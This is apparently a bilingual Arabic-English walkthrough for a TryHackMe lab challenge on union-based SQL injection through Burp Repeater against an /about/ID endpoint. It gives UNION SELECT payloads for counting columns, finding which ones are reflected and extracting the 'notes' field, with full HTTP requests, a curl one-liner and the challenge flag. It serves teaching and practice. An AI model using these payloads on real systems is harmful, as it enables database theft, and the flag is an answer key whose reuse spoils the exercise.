# Task 08: Extra-mile Challenge (التحدي المتقدم: استغلال حقن SQL القائم على الاتحاد UNION SQLi)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Now that you have mastered basic header tampering and parameter fuzzing in Repeater, this extra-mile challenge tasks you with exploiting a classic database vulnerability: **Union-based SQL Injection (UNION SQLi)**.

On the target application, navigate to the "About Us" section or examine team member profiles located at `/about/ID` (e.g., `/about/1`, `/about/2`).
The back-end server takes the `ID` parameter directly from the URL path and concatenates it unsanitized into an SQL query resembling:
```sql
SELECT id, name, title, bio, image FROM people WHERE id = $ID;
```

Your objective is to:
1. Capture a valid request to `/about/1` in Burp Proxy and dispatch it to **Repeater** (`Ctrl + R`).
2. Verify the vulnerability by injecting SQL characters (e.g., `'` or mathematical operations).
3. Determine the exact number of columns returned by the original query using `UNION SELECT null, null, ...`.
4. Identify which column data types reflect text on the front-end page.
5. Extract the secret flag stored within the database table (specifically the `people` table or schema tables).
6. Locate the flag and submit it.

#### الأسئلة المطروحة (Questions):
1. Exploit the union-based SQL injection vulnerability on the /about/ID endpoint to find the flag in the database. (استغل ثغرة حقن SQL القائمة على الاتحاد في نقطة نهاية /about/ID للعثور على الراية في قاعدة البيانات.)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **المسار المنهجي لاستغلال ثغرات UNION-Based SQL Injection:**
  1. **إثبات قابلية الحقن (Proof of Injection):**
     * كسر الاستعلام عبر وضع رمز التنصيص المفرد أو اختبار العمليات المنطقية: `/about/1'` أو `/about/2-1`.
  2. **تحديد عدد الأعمدة (Column Count Enumeration):**
     * استخدام عبارة `ORDER BY N--` أو `UNION SELECT null, null, ...`.
     * في قواعد بيانات SQL، يتطلب مشغل `UNION` أن تحتوي كلتا الجملتين (`SELECT`) على **نفس عدد الأعمدة بالضبط** وبأنواع بيانات متوافقة.
  3. **تحديد الأعمدة المنعكسة في واجهة المستخدم (Reflected Column Discovery):**
     * استبدال قيم `null` بأرقام أو نصوص واضحة مثل `'a', 'b', 'c'` ومراقبة مكان ظهورها في استجابة Repeater.
  4. **استخراج البيانات الحساسة (Data Exfiltration):**
     * استعلام جدول `people` عن الحقول المتاحة (مثل حقل `notes` أو `bio` أو جداول النظام مثل `sqlite_master` أو `information_schema.tables`).

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * ابدأ بإرسال طلب `/about/1` إلى Repeater.
2. **التلميح الثاني (المستوى العملي):**
   * جرب استخدام صفر `0` في معرّف المسار حتى لا يرجع الاستعلام الأصلي أي صف، متبوعاً بجملة `UNION SELECT`:
     `/about/0 UNION ALL SELECT 1,2,3,4,5`
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * الاستعلام الأصلي يعتمد على 5 أعمدة. ابحث في حقول جدول الأشخاص `people`، وتحديداً حقل الملاحظات `notes` حيث تم تخزين الراية لأحد المعرفات (مثل `id=1`):
     `/about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1`
   * ستظهر الراية `THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}` في جسم الاستجابة.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### الخطوة 1: فحص عدد الأعمدة (Determining Column Count)
نقوم باختبار استعلام الاتحاد مع زيادة عدد قيم `null` حتى نحصل على استجابة طبيعية (200 OK دون خطأ داخلي):
```text
/about/0 UNION ALL SELECT null               --> 500 Error (Column mismatch)
/about/0 UNION ALL SELECT null,null          --> 500 Error
/about/0 UNION ALL SELECT null,null,null     --> 500 Error
/about/0 UNION ALL SELECT null,null,null,null --> 500 Error
/about/0 UNION ALL SELECT null,null,null,null,null --> 200 OK (5 columns confirmed!)
```

#### الخطوة 2: اختبار انعكاس الأعمدة في الواجهة (Testing Reflected Columns)
نرسل طلباً في Repeater يحتوي على نصوص لاكتشاف أي عمود يظهر في الصفحة:
```http
GET /about/0%20UNION%20ALL%20SELECT%20'COL1','COL2','COL3','COL4','COL5' HTTP/1.1
Host: 10.10.123.45
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
```
نلاحظ في استجابة الخادم أن نصوص الأعمدة تظهر في عنوان الملف الشخصي ووصفه وملاحظاته.

#### الخطوة 3: استخراج الراية من جدول `people` (Extracting the Flag)
من خلال استعراض بيانات قاعدة البيانات أو الاستعلام عن الأعمدة الخاصة بجدول الأشخاص `people`:
```http
GET /about/0%20UNION%20ALL%20SELECT%20notes,null,null,null,null%20FROM%20people%20WHERE%20id%20=%201 HTTP/1.1
Host: 10.10.123.45
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
```

#### استجابة الخادم المستخرجة (Exfiltrated Response Body):
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 512

<div class="profile-card">
  <h2>Staff Profile</h2>
  <div class="bio">
    <p>THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}</p>
  </div>
</div>
```

#### الاستخراج عبر سطر الأوامر (Command Line Verification):
```bash
# تنفيذ هجوم الاتحاد واستخراج الراية مباشرة عبر curl
curl -s "http://MACHINE_IP/about/0%20UNION%20ALL%20SELECT%20notes,null,null,null,null%20FROM%20people%20WHERE%20id%20=%201" \
  | grep -o "THM{[^}]*}"
```

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **قيمة الراية المستخرجة (Extracted Flag):**
  `THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم تأكيد نجاح الاستغلال واستخراج الراية بنسبة 100% ومطابقتها التامة مع سجل إنجازات الحساب المكتمل في TryHackMe.
* يبرهن هذا التحدي على القدرة العالية لأداة Repeater في صياغة حمولات SQL المعقدة وفك ترميزها وتعديلها بالبايت حتى الحصول على البيانات الحساسة من عمق قاعدة البيانات.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* دمج المعاملات غير المنقاة مباشرة في استعلامات SQL يمنح المهاجم قدرة كاملة على استخراج أي جدول في قاعدة البيانات عبر `UNION SELECT`. وتوفر أداة Repeater البيئة المثلى لضبط الحمولات بدقة واكتشاف الأعمدة المتوافقة بايت ببايت.
